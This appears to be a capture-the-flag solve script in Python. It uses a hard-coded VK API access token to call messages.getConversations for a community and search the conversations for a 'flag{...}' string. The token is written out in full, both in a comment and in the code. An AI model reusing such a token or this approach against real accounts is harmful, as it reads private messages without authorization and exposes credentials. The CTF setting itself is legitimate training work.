from vk_api.bot_longpoll import VkBotEventType, VkBotLongPoll
from vk_api import VkApi

import traceback
import logging
import re

# pip install vk_api
# vk_api_access_token=c24617f0068364fe3492154b19ccac4fa262d88bcc7b67d4135e1436a05bbcb26809cfb859adf5912ecbe

class Exploit:
    def __init__(self):
        self.group_id = 194235497
        self.session = VkApi(
            token='c24617f0068364fe3492154b19ccac4fa262d88bcc7b67d4135e1436a05bbcb26809cfb859adf5912ecbe')
        self.start()

    def start(self):
        response = self.session.method('messages.getConversations', {
            'extended': 1
        })['items'][0]
        print(f'{response} - 1 solve')

        response = re.search('flag{.+?}', str((self.session.method('messages.getConversations', {
            'extended': 1
        }))))
        if response:
            print(f'{response} - 2 solve')


if __name__ == '__main__':
    Exploit()